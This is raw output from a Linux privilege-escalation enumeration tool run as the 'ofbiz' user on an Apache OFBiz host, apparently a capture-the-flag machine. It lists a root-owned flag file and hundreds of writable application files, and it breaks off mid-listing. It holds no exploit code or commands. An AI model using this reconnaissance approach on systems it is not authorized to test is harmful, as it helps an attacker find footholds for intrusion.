
╔══════════╣ Readable files belonging to root and readable by me but not world readable                                                                   
-rw-r----- 1 root ofbiz-operator 33 Jan 15 09:20 /home/ofbiz/user.txt        

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                       
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                         
/dev/mqueue                                                                  
/dev/shm
/home/ofbiz
/opt/ofbiz
/opt/ofbiz/APACHE2_HEADER
/opt/ofbiz/applications
/opt/ofbiz/applications/accounting
/opt/ofbiz/applications/accounting/config
/opt/ofbiz/applications/accounting/config/AccountingEntityLabels.xml
/opt/ofbiz/applications/accounting/config/AccountingErrorUiLabels.xml
/opt/ofbiz/applications/accounting/config/accounting.properties
/opt/ofbiz/applications/accounting/config/AccountingUiLabels.xml
/opt/ofbiz/applications/accounting/config/arithmetic.properties
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/data
/opt/ofbiz/applications/accounting/data/AccountingHelpData.xml
/opt/ofbiz/applications/accounting/data/AccountingPortletData.xml
/opt/ofbiz/applications/accounting/data/AccountingScheduledServiceData.xml
/opt/ofbiz/applications/accounting/data/AccountingSecurityPermissionSeedData.xml
/opt/ofbiz/applications/accounting/data/helpdata
/opt/ofbiz/applications/accounting/data/helpdata/HELP_ACCOUNTING_agreements.xml
/opt/ofbiz/applications/accounting/data/helpdata/HELP_ACCOUNTING_AssignGlAccount.xml
/opt/ofbiz/applications/accounting/data/helpdata/HELP_ACCOUNTING_AuthorizeTransaction.xml
/opt/ofbiz/applications/accounting/data/helpdata/HELP_ACCOUNTING_BankReconciliation.xml
/opt/ofbiz/applications/accounting/data/helpdata/HELP_ACCOUNTING_BillingAccountInvoices.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/data/OfbizSetupChartOfAccountsData.xml
/opt/ofbiz/applications/accounting/documents
/opt/ofbiz/applications/accounting/documents/Accounting.xml
/opt/ofbiz/applications/accounting/entitydef
/opt/ofbiz/applications/accounting/entitydef/eecas.xml
/opt/ofbiz/applications/accounting/entitydef/entitymodel_reports.xml
/opt/ofbiz/applications/accounting/groovyScripts
/opt/ofbiz/applications/accounting/groovyScripts/admin
/opt/ofbiz/applications/accounting/groovyScripts/admin/AcctgAdminServices.groovy
/opt/ofbiz/applications/accounting/groovyScripts/admin/FilterOutReceipts.groovy
/opt/ofbiz/applications/accounting/groovyScripts/admin/ListInvoiceItemTypesGlAccount.groovy
/opt/ofbiz/applications/accounting/groovyScripts/agreement
/opt/ofbiz/applications/accounting/groovyScripts/agreement/AgreementServices.groovy
/opt/ofbiz/applications/accounting/groovyScripts/agreement/GetPartyNameForDate.groovy
/opt/ofbiz/applications/accounting/groovyScripts/ap
/opt/ofbiz/applications/accounting/groovyScripts/ap/invoices
/opt/ofbiz/applications/accounting/groovyScripts/ap/invoices/CommissionReport.groovy
/opt/ofbiz/applications/accounting/groovyScripts/ap/invoices/CommissionRun.groovy
/opt/ofbiz/applications/accounting/groovyScripts/ar
/opt/ofbiz/applications/accounting/groovyScripts/ar/BatchPayments.groovy
/opt/ofbiz/applications/accounting/groovyScripts/budget
/opt/ofbiz/applications/accounting/groovyScripts/budget/BudgetServices.groovy
/opt/ofbiz/applications/accounting/groovyScripts/chartofaccounts
/opt/ofbiz/applications/accounting/groovyScripts/chartofaccounts/TaxAuthorityGlAccounts.groovy
/opt/ofbiz/applications/accounting/groovyScripts/fixedasset
/opt/ofbiz/applications/accounting/groovyScripts/fixedasset/FixedAssetGeoLocation.groovy
/opt/ofbiz/applications/accounting/groovyScripts/invoice
/opt/ofbiz/applications/accounting/groovyScripts/invoice/CreateApplicationList.groovy
/opt/ofbiz/applications/accounting/groovyScripts/invoice/EditInvoice.groovy
/opt/ofbiz/applications/accounting/groovyScripts/invoice/GetAccountOrganizationAndClass.groovy
/opt/ofbiz/applications/accounting/groovyScripts/invoice/InvoiceReport.groovy
/opt/ofbiz/applications/accounting/groovyScripts/invoice/InvoiceServices.groovy
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/groovyScripts/order
/opt/ofbiz/applications/accounting/groovyScripts/order/BillingAccountOrders.groovy
/opt/ofbiz/applications/accounting/groovyScripts/payment
/opt/ofbiz/applications/accounting/groovyScripts/payment/BillingAccounts.groovy
/opt/ofbiz/applications/accounting/groovyScripts/payment/DepositWithdrawPayments.groovy
/opt/ofbiz/applications/accounting/groovyScripts/payment/FindInvoicesByDueDate.groovy
/opt/ofbiz/applications/accounting/groovyScripts/payment/ListNotAppliedInvoices.groovy
/opt/ofbiz/applications/accounting/groovyScripts/payment/ListNotAppliedPayments.groovy
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/groovyScripts/period
/opt/ofbiz/applications/accounting/groovyScripts/period/EditCustomTimePeriod.groovy
/opt/ofbiz/applications/accounting/groovyScripts/rate
/opt/ofbiz/applications/accounting/groovyScripts/rate/RateServices.groovy
/opt/ofbiz/applications/accounting/groovyScripts/reports
/opt/ofbiz/applications/accounting/groovyScripts/reports/BalanceSheet.groovy
/opt/ofbiz/applications/accounting/groovyScripts/reports/CashFlowStatement.groovy
/opt/ofbiz/applications/accounting/groovyScripts/reports/ComparativeBalanceSheet.groovy
/opt/ofbiz/applications/accounting/groovyScripts/reports/ComparativeCashFlowStatement.groovy
/opt/ofbiz/applications/accounting/groovyScripts/reports/ComparativeIncomeStatement.groovy
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/groovyScripts/test
/opt/ofbiz/applications/accounting/groovyScripts/test/AutoAcctgBudgetTests.groovy
/opt/ofbiz/applications/accounting/groovyScripts/transaction
/opt/ofbiz/applications/accounting/groovyScripts/transaction/AuthorizeTransaction.groovy
/opt/ofbiz/applications/accounting/groovyScripts/transaction/CaptureTransaction.groovy
/opt/ofbiz/applications/accounting/groovyScripts/transaction/ViewGatewayResponse.groovy
/opt/ofbiz/applications/accounting/minilang
/opt/ofbiz/applications/accounting/minilang/finaccount
/opt/ofbiz/applications/accounting/minilang/finaccount/FinAccountGlPostServices.xml
/opt/ofbiz/applications/accounting/minilang/finaccount/FinAccountServices.xml
/opt/ofbiz/applications/accounting/minilang/fixedasset
/opt/ofbiz/applications/accounting/minilang/fixedasset/FixedAssetServices.xml
/opt/ofbiz/applications/accounting/minilang/invoice
/opt/ofbiz/applications/accounting/minilang/invoice/InvoiceEvents.xml
/opt/ofbiz/applications/accounting/minilang/invoice/InvoiceServices.xml
/opt/ofbiz/applications/accounting/minilang/invoice/SampleCommissionServices.xml
/opt/ofbiz/applications/accounting/minilang/ledger
/opt/ofbiz/applications/accounting/minilang/ledger/AcctgTransServices.xml
/opt/ofbiz/applications/accounting/minilang/ledger/GeneralLedgerServices.xml
/opt/ofbiz/applications/accounting/minilang/payment
/opt/ofbiz/applications/accounting/minilang/payment/PaymentGatewayConfigServices.xml
/opt/ofbiz/applications/accounting/minilang/payment/PaymentMapProcs.xml
/opt/ofbiz/applications/accounting/minilang/payment/PaymentMethodEvents.xml
/opt/ofbiz/applications/accounting/minilang/payment/PaymentMethodServices.xml
/opt/ofbiz/applications/accounting/minilang/payment/PaymentServices.xml
/opt/ofbiz/applications/accounting/minilang/period
/opt/ofbiz/applications/accounting/minilang/period/PeriodServices.xml
/opt/ofbiz/applications/accounting/minilang/permissions
/opt/ofbiz/applications/accounting/minilang/permissions/PermissionServices.xml
/opt/ofbiz/applications/accounting/minilang/tax
/opt/ofbiz/applications/accounting/minilang/tax/TaxAuthorityServices.xml
/opt/ofbiz/applications/accounting/minilang/test
/opt/ofbiz/applications/accounting/minilang/test/AutoAcctgAdminTests.xml
/opt/ofbiz/applications/accounting/minilang/test/AutoAcctgAgreementTests.xml
/opt/ofbiz/applications/accounting/minilang/test/AutoAcctgCostTests.xml
/opt/ofbiz/applications/accounting/minilang/test/AutoAcctgFinAccountTests.xml
/opt/ofbiz/applications/accounting/minilang/test/AutoAcctgFixedAssetTests.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/ofbiz-component.xml
/opt/ofbiz/applications/accounting/README.md
/opt/ofbiz/applications/accounting/servicedef
/opt/ofbiz/applications/accounting/servicedef/groups.xml
/opt/ofbiz/applications/accounting/servicedef/secas_invoice.xml
/opt/ofbiz/applications/accounting/servicedef/secas_ledger.xml
/opt/ofbiz/applications/accounting/servicedef/secas_payment.xml
/opt/ofbiz/applications/accounting/servicedef/secas.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/src
/opt/ofbiz/applications/accounting/src/docs
/opt/ofbiz/applications/accounting/src/docs/asciidoc
/opt/ofbiz/applications/accounting/src/docs/asciidoc/accounting.adoc
/opt/ofbiz/applications/accounting/src/docs/asciidoc/_include
/opt/ofbiz/applications/accounting/src/docs/asciidoc/_include/acc-agreements.adoc
/opt/ofbiz/applications/accounting/src/docs/asciidoc/_include/acc-financial-accounts.adoc
/opt/ofbiz/applications/accounting/src/docs/asciidoc/_include/acc-global-settings.adoc
/opt/ofbiz/applications/accounting/src/docs/asciidoc/_include/acc-intro.adoc
/opt/ofbiz/applications/accounting/src/main
/opt/ofbiz/applications/accounting/src/main/java
/opt/ofbiz/applications/accounting/src/main/java/org
/opt/ofbiz/applications/accounting/src/main/java/org/apache
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/AccountingException.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/agreement
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/agreement/AgreementServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/finaccount
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/finaccount/FinAccountPaymentServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/finaccount/FinAccountProductServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/finaccount/FinAccountServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/GlEvents.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/invoice
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/invoice/InvoiceServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/invoice/InvoiceWorker.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/ledger
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/ledger/GeneralLedgerServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/payment
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/payment/BillingAccountWorker.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/payment/GiftCertificateServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/payment/PaymentGatewayServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/payment/PaymentMethodServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/payment/PaymentWorker.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/period
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/period/PeriodServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/tax
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/tax/TaxAuthorityServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/test
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/test/FinAccountTests.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/authorizedotnet
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/authorizedotnet/AIMPaymentServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/authorizedotnet/AIMRespPositions.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/authorizedotnet/AuthorizeResponse.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/authorizedotnet/CPRespPositions.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/clearcommerce
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/clearcommerce/CCPaymentServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/clearcommerce/CCServicesTest.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/cybersource
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/cybersource/IcsPaymentServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/eway
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/eway/EwayServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/eway/GatewayConnector.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/eway/GatewayRequest.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/eway/GatewayResponse.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/gosoftware
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/gosoftware/PcChargeApi.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/gosoftware/PcChargeServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/gosoftware/RitaApi.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/gosoftware/RitaServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/orbital
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/orbital/OrbitalPaymentServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/paypal
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/paypal/PayPalEvents.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/paypal/PayPalServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/sagepay
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/sagepay/SagePayPaymentServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/sagepay/SagePayServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/sagepay/SagePayUtil.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/securepay
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/securepay/SecurePayPaymentServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/securepay/SecurePayServiceTest.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/valuelink
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/valuelink/ValueLinkApi.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/valuelink/ValueLinkServices.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/verisign
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/verisign/PayflowPro.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/worldpay
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/worldpay/WorldPayEvents.java
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/util
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/util/UtilAccounting.java
/opt/ofbiz/applications/accounting/template
/opt/ofbiz/applications/accounting/template/agreement
/opt/ofbiz/applications/accounting/template/agreement/CopyAgreement.ftl
/opt/ofbiz/applications/accounting/template/ap
/opt/ofbiz/applications/accounting/template/ap/invoices
/opt/ofbiz/applications/accounting/template/ap/invoices/CommissionReport.ftl
/opt/ofbiz/applications/accounting/template/ap/invoices/CommissionRun.ftl
/opt/ofbiz/applications/accounting/template/ap/invoices/PurchaseInvoices.ftl
/opt/ofbiz/applications/accounting/template/ap/reports
/opt/ofbiz/applications/accounting/template/ap/reports/CommissionReport.fo.ftl
/opt/ofbiz/applications/accounting/template/ar
/opt/ofbiz/applications/accounting/template/ar/invoice
/opt/ofbiz/applications/accounting/template/ar/invoice/ListInvoices.ftl
/opt/ofbiz/applications/accounting/template/ar/payment
/opt/ofbiz/applications/accounting/template/ar/payment/BatchPayments.ftl
/opt/ofbiz/applications/accounting/template/common
/opt/ofbiz/applications/accounting/template/common/CreditCardFields.ftl
/opt/ofbiz/applications/accounting/template/finaccounttrans
/opt/ofbiz/applications/accounting/template/finaccounttrans/FinAccountTrans.ftl
/opt/ofbiz/applications/accounting/template/finaccounttrans/GlReconciledFinAccountTrans.ftl
/opt/ofbiz/applications/accounting/template/finaccounttrans/ShowGlTransactions.ftl
/opt/ofbiz/applications/accounting/template/invoice
/opt/ofbiz/applications/accounting/template/invoice/InvoiceItemsPayrol.ftl
/opt/ofbiz/applications/accounting/template/invoice/InvoiceReportContactMechs.fo.ftl
/opt/ofbiz/applications/accounting/template/invoice/InvoiceReportHeaderInfo.fo.ftl
/opt/ofbiz/applications/accounting/template/invoice/InvoiceReportItems.fo.ftl
/opt/ofbiz/applications/accounting/template/invoice/NoAccountingView.fo.ftl
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/template/ledger
/opt/ofbiz/applications/accounting/template/ledger/CostCenters.ftl
/opt/ofbiz/applications/accounting/template/Main.ftl
/opt/ofbiz/applications/accounting/template/payment
/opt/ofbiz/applications/accounting/template/payment/DepositWithdrawPayments.ftl
/opt/ofbiz/applications/accounting/template/payment/ManualCCTx.ftl
/opt/ofbiz/applications/accounting/template/payment/ManualTx.ftl
/opt/ofbiz/applications/accounting/template/payment/PrintChecks.fo.ftl
/opt/ofbiz/applications/accounting/template/period
/opt/ofbiz/applications/accounting/template/period/EditCustomTimePeriod.ftl
/opt/ofbiz/applications/accounting/template/reports
/opt/ofbiz/applications/accounting/template/reports/AcctgTransEntriesSearchResult.fo.ftl
/opt/ofbiz/applications/accounting/template/reports/AcctgTransSearchResult.fo.ftl
/opt/ofbiz/applications/accounting/template/reports/ChartOfAccount.fo.ftl
/opt/ofbiz/applications/accounting/template/reports/CostCentersReport.fo.ftl
/opt/ofbiz/applications/accounting/template/reports/CostCentersReport.ftl
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/testdef
/opt/ofbiz/applications/accounting/testdef/accountingtests.xml
/opt/ofbiz/applications/accounting/testdef/data
/opt/ofbiz/applications/accounting/testdef/data/AccountingTestsData.xml
/opt/ofbiz/applications/accounting/testdef/data/PaymentApplicationTestsData.xml
/opt/ofbiz/applications/accounting/testdef/data/RateTestsData.xml
/opt/ofbiz/applications/accounting/testdef/fixedassettests.xml
/opt/ofbiz/applications/accounting/testdef/invoicetests.xml
/opt/ofbiz/applications/accounting/testdef/paymentappltests.xml
/opt/ofbiz/applications/accounting/testdef/paymenttests.xml
/opt/ofbiz/applications/accounting/testdef/ratetests.xml
/opt/ofbiz/applications/accounting/webapp
/opt/ofbiz/applications/accounting/webapp/accounting
/opt/ofbiz/applications/accounting/webapp/accounting/error
/opt/ofbiz/applications/accounting/webapp/accounting/error/error403.jsp
/opt/ofbiz/applications/accounting/webapp/accounting/error/error404.jsp
/opt/ofbiz/applications/accounting/webapp/accounting/index.jsp
/opt/ofbiz/applications/accounting/webapp/accounting/WEB-INF
/opt/ofbiz/applications/accounting/webapp/accounting/WEB-INF/controller.xml
/opt/ofbiz/applications/accounting/webapp/accounting/WEB-INF/web.xml
/opt/ofbiz/applications/accounting/webapp/ap
/opt/ofbiz/applications/accounting/webapp/ap/error
/opt/ofbiz/applications/accounting/webapp/ap/error/error403.jsp
/opt/ofbiz/applications/accounting/webapp/ap/error/error404.jsp
/opt/ofbiz/applications/accounting/webapp/ap/index.jsp
/opt/ofbiz/applications/accounting/webapp/ap/WEB-INF
/opt/ofbiz/applications/accounting/webapp/ap/WEB-INF/controller.xml
/opt/ofbiz/applications/accounting/webapp/ap/WEB-INF/web.xml
/opt/ofbiz/applications/accounting/webapp/ar
/opt/ofbiz/applications/accounting/webapp/ar/error
/opt/ofbiz/applications/accounting/webapp/ar/error/error403.jsp
/opt/ofbiz/applications/accounting/webapp/ar/error/error404.jsp
/opt/ofbiz/applications/accounting/webapp/ar/index.jsp
/opt/ofbiz/applications/accounting/webapp/ar/WEB-INF
/opt/ofbiz/applications/accounting/webapp/ar/WEB-INF/controller.xml
/opt/ofbiz/applications/accounting/webapp/ar/WEB-INF/web.xml
/opt/ofbiz/applications/accounting/widget
/opt/ofbiz/applications/accounting/widget/AccountingMenus.xml
/opt/ofbiz/applications/accounting/widget/AccountingPrintScreens.xml
/opt/ofbiz/applications/accounting/widget/AccountingTrees.xml
/opt/ofbiz/applications/accounting/widget/AgreementForms.xml
/opt/ofbiz/applications/accounting/widget/AgreementScreens.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/accounting/widget/ap/ApMenus.xml
/opt/ofbiz/applications/accounting/widget/ap/ApPrintScreens.xml
/opt/ofbiz/applications/accounting/widget/ap/ApScreens.xml
/opt/ofbiz/applications/accounting/widget/ap/CommonScreens.xml
/opt/ofbiz/applications/accounting/widget/ap/forms
/opt/ofbiz/applications/accounting/widget/ap/forms/InvoiceForms.xml
/opt/ofbiz/applications/accounting/widget/ap/forms/LookupForms.xml
/opt/ofbiz/applications/accounting/widget/ap/forms/VendorForms.xml
/opt/ofbiz/applications/accounting/widget/ap/InvoiceScreens.xml
/opt/ofbiz/applications/accounting/widget/ap/LookupScreens.xml
/opt/ofbiz/applications/accounting/widget/ar
/opt/ofbiz/applications/accounting/widget/ar/ArMenus.xml
/opt/ofbiz/applications/accounting/widget/ar/ArPaymentScreens.xml
/opt/ofbiz/applications/accounting/widget/ar/CommonScreens.xml
/opt/ofbiz/applications/accounting/widget/ar/forms
/opt/ofbiz/applications/accounting/widget/ar/forms/ArPaymentForms.xml
/opt/ofbiz/applications/accounting/widget/ar/forms/InvoiceForms.xml
/opt/ofbiz/applications/accounting/widget/ar/forms/LookupForms.xml
/opt/ofbiz/applications/accounting/widget/ar/InvoiceScreens.xml
/opt/ofbiz/applications/accounting/widget/ar/LookupScreens.xml
/opt/ofbiz/applications/accounting/widget/BillingAccountForms.xml
/opt/ofbiz/applications/accounting/widget/BillingAccountScreens.xml
/opt/ofbiz/applications/accounting/widget/BudgetForms.xml
/opt/ofbiz/applications/accounting/widget/BudgetScreens.xml
/opt/ofbiz/applications/accounting/widget/CommonScreens.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/commonext
/opt/ofbiz/applications/commonext/config
/opt/ofbiz/applications/commonext/config/CommonExtUiLabels.xml
/opt/ofbiz/applications/commonext/config/SeoConfig.xml
/opt/ofbiz/applications/commonext/config/SetupUiLabels.xml
/opt/ofbiz/applications/commonext/data
/opt/ofbiz/applications/commonext/data/CommonExtHelpData.xml
/opt/ofbiz/applications/commonext/data/CommonExtSecurityPermissionSeedData.xml
/opt/ofbiz/applications/commonext/data/helpdata
/opt/ofbiz/applications/commonext/data/helpdata/HELP_OFBizDocumentationSystem_FR.xml
/opt/ofbiz/applications/commonext/data/helpdata/HELP_OFBizDocumentationSystem.xml
/opt/ofbiz/applications/commonext/data/helpdata/HELP_SETUP_editFacility.xml
/opt/ofbiz/applications/commonext/data/helpdata/HELP_SETUP_editProductStore.xml
/opt/ofbiz/applications/commonext/data/helpdata/HELP_SETUP_editWebSite.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/commonext/data/OfbizSetupGlAccountData.xml
/opt/ofbiz/applications/commonext/data/OfbizSetupProductStoreData.xml
/opt/ofbiz/applications/commonext/data/OfbizSetupSecurityPermissionSeedData.xml
/opt/ofbiz/applications/commonext/data/OfbizSetupShippingData.xml
/opt/ofbiz/applications/commonext/data/SetupData.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/commonext/documents
/opt/ofbiz/applications/commonext/documents/Setup.xml
/opt/ofbiz/applications/commonext/entitydef
/opt/ofbiz/applications/commonext/entitydef/entitymodel.xml
/opt/ofbiz/applications/commonext/groovyScripts
/opt/ofbiz/applications/commonext/groovyScripts/ofbizsetup
/opt/ofbiz/applications/commonext/groovyScripts/ofbizsetup/ChangeOrgPartyId.groovy
/opt/ofbiz/applications/commonext/groovyScripts/ofbizsetup/FindFacility.groovy
/opt/ofbiz/applications/commonext/groovyScripts/ofbizsetup/GetProdCatalog.groovy
/opt/ofbiz/applications/commonext/groovyScripts/ofbizsetup/GetProductStoreAndWebSite.groovy
/opt/ofbiz/applications/commonext/minilang
/opt/ofbiz/applications/commonext/minilang/setup
/opt/ofbiz/applications/commonext/minilang/setup/SetupEvents.xml
/opt/ofbiz/applications/commonext/minilang/SystemInfoServices.xml
/opt/ofbiz/applications/commonext/ofbiz-component.xml
/opt/ofbiz/applications/commonext/README.md
/opt/ofbiz/applications/commonext/servicedef
/opt/ofbiz/applications/commonext/servicedef/secas.xml
/opt/ofbiz/applications/commonext/servicedef/services.xml
/opt/ofbiz/applications/commonext/webapp
/opt/ofbiz/applications/commonext/webapp/ofbizsetup
/opt/ofbiz/applications/commonext/webapp/ofbizsetup/index.jsp
/opt/ofbiz/applications/commonext/webapp/ofbizsetup/WEB-INF
/opt/ofbiz/applications/commonext/webapp/ofbizsetup/WEB-INF/controller.xml
/opt/ofbiz/applications/commonext/webapp/ofbizsetup/WEB-INF/web.xml
/opt/ofbiz/applications/commonext/webapp/ordermgr-js
/opt/ofbiz/applications/commonext/webapp/ordermgr-js/ConvertUom.js
/opt/ofbiz/applications/commonext/webapp/ordermgr-js/geoAutoCompleter.js
/opt/ofbiz/applications/commonext/webapp/ordermgr-js/order.js
/opt/ofbiz/applications/commonext/webapp/ordermgr-js/OrderShippingInfo.js
/opt/ofbiz/applications/commonext/webapp/ordermgr-js/return.js
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/commonext/webapp/ordermgr-js/WEB-INF/web.xml
/opt/ofbiz/applications/commonext/webapp/WEB-INF
/opt/ofbiz/applications/commonext/webapp/WEB-INF/controller.xml
/opt/ofbiz/applications/commonext/widget
/opt/ofbiz/applications/commonext/widget/CommonScreens.xml
/opt/ofbiz/applications/commonext/widget/ofbizsetup
/opt/ofbiz/applications/commonext/widget/ofbizsetup/CommonScreens.xml
/opt/ofbiz/applications/commonext/widget/ofbizsetup/Menus.xml
/opt/ofbiz/applications/commonext/widget/ofbizsetup/ProfileScreens.xml
/opt/ofbiz/applications/commonext/widget/ofbizsetup/SetupForms.xml
/opt/ofbiz/applications/commonext/widget/ofbizsetup/SetupScreens.xml
/opt/ofbiz/applications/commonext/widget/SystemInfoForms.xml
/opt/ofbiz/applications/commonext/widget/SystemInfoMenus.xml
/opt/ofbiz/applications/commonext/widget/SystemInfoScreens.xml
/opt/ofbiz/applications/component-load.xml
/opt/ofbiz/applications/content
/opt/ofbiz/applications/content/config
/opt/ofbiz/applications/content/config/ContentEntityLabels.xml
/opt/ofbiz/applications/content/config/ContentErrorUiLabels.xml
/opt/ofbiz/applications/content/config/content.properties
/opt/ofbiz/applications/content/config/contentsearch.properties
/opt/ofbiz/applications/content/config/ContentUiLabels.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/content/data
/opt/ofbiz/applications/content/data/ContentHelpData.xml
/opt/ofbiz/applications/content/data/ContentHttpErrorData.xml
/opt/ofbiz/applications/content/data/ContentPortletData.xml
/opt/ofbiz/applications/content/data/helpdata
/opt/ofbiz/applications/content/data/helpdata/HELP_CONTENT_IT.xml
/opt/ofbiz/applications/content/data/helpdata/HELP_CONTENT_SITE_FindWeb.xml
/opt/ofbiz/applications/content/data/helpdata/HELP_CONTENT.xml
/opt/ofbiz/applications/content/data/helpdata/HELP_ROOT_FR.xml
/opt/ofbiz/applications/content/data/helpdata/HELP_ROOT_IT.xml
#)You_can_write_even_more_files_inside_last_directory

/opt/ofbiz/applications/content/data/PartyHelpData.xml
/opt/ofbiz/applications/content/data/WebtoolsHelpData.xml
/opt/ofbiz/applications/content/documents
/opt/ofbiz/applications/content/documents/Content.xml
/opt/ofbiz/applications/content/dtd
/opt/ofbiz/applications/content/dtd/docbook.dtd
/opt/ofbiz/applications/content/dtd/docbookx.dtd
/opt/ofbiz/applications/content/dtd/docbook.xsd
/opt/ofbiz/applications/content/dtd/xlink.xsd
/opt/ofbiz/applications/content/dtd/xml.xsd
/opt/ofbiz/applications/content/entitydef
/opt/ofbiz/applications/content/entitydef/eecas.xml
/opt/ofbiz/applications/content/groovyScripts
/opt/ofbiz/applications/content/groovyScripts/cms
